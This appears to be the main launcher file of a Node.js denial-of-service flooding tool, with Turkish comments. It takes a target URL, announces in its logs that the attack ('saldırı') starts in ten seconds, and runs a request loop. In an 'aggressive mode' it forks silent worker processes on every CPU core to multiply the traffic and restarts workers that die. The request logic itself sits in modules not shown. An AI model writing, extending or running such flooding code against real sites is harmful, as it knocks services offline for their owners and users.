const App = require('./src/app');
const LoopManager = require('./src/loop');
const cluster = require('cluster');

async function main() {
    try {
        // Komut satırından URL'yi al
        const urlArg = process.argv[2];

        // Worker process ise sessizce çalıştır (hiç log basma)
        if (cluster.isWorker) {
            try {
                // Worker process: Sadece istek gönderme mantığı (sessiz)
                const app = new App();
                await app.initialize(urlArg);
                const loopManager = new LoopManager(app.getRequestHandler(), app.getConfig());
                loopManager.start();

                return; // Worker işini bitirdi
            } catch (error) {
                // Worker hatalarını sessizce işle
                process.exit(1);
            }
        }

        // Master process mantığı (aggressive mode veya normal mode)
        const app = new App();
        await app.initialize(urlArg);

        // Sadece master process'te başlatma logları göster
        if (!app.getConfig().aggressiveMode || cluster.isMaster) {
            console.log('⏳ Saldırı 10 saniye sonra başlayacak...');
            await new Promise(resolve => setTimeout(resolve, 10000));
            console.log('🚀 Saldırı başlatılıyor!\n');
        }

        // Aggressive mode ve master process ise worker'ları yönet
        if (app.getConfig().aggressiveMode && cluster.isMaster) {
            console.log('🎯 Aggressive mode aktif - Multi-process kullanılıyor');
            // Master sadece koordinasyon yapar, loop başlatmaz
        } else {
            // Normal mode'da loop başlat
            const loopManager = new LoopManager(app.getRequestHandler(), app.getConfig());
            loopManager.start();
        }

        // Aggressive mode ise cluster event handling
        if (app.getConfig().aggressiveMode && cluster.isMaster) {
            const workerIds = new Map(); // Worker ID'lerini sakla
            let restartCount = 0;
            const maxRestarts = 3; // Worker başına maksimum yeniden başlatma

            cluster.on('exit', (worker, code, signal) => {
                if (code !== 0 && !signal && restartCount < maxRestarts) { // Normal çıkış değilse ve limit aşılmamışsa yeniden başlat
                    restartCount++;
                    console.log(`💀 Worker ${worker.process.pid} öldü (${code}). Yeniden başlatma ${restartCount}/${maxRestarts}...`);
                    setTimeout(() => cluster.fork(), 2000);
                } else if (code !== 0) {
                    console.log(`💀 Worker ${worker.process.pid} çok fazla kez öldü. Yeniden başlatılmayacak.`);
                } else {
                    console.log(`👋 Worker ${worker.process.pid} normal şekilde kapatıldı`);
                }
            });

            // İlk worker'ları başlat
            const numCPUs = require('os').cpus().length;
            console.log(`🚀 ${numCPUs} worker process başlatılıyor...`);
            for (let i = 0; i < numCPUs; i++) {
                const workerId = i + 1;
                const worker = cluster.fork({
                    WORKER_ID: workerId
                });
                workerIds.set(worker.id, workerId);
            }
        }

        // Ctrl+C sinyalini yakala (sadece master process'te)
        if (!app.getConfig().aggressiveMode || cluster.isMaster) {
            process.on('SIGINT', () => {
                console.log('\n🛑 Kapatma sinyali alındı...');

                if (app.getConfig().aggressiveMode && cluster.isMaster) {
                    // Tüm worker'ları kapat
                    for (const id in cluster.workers) {
                        cluster.workers[id].kill();
                    }
                    console.log('🔄 Tüm worker process\'ler kapatıldı');
                }
                // Normal mode'da loop durdurma işlemi gerekmiyor

                app.shutdown();
                process.exit(0);
            });
        }

        // Sonsuz bekle (programın kapanmasını engelle)
        await new Promise(() => {});

    } catch (error) {
        console.error('Kritik hata:', error.message);
        process.exit(1);
    }
}

// Uygulamayı başlat
if (require.main === module) {
    main();
}

module.exports = { main };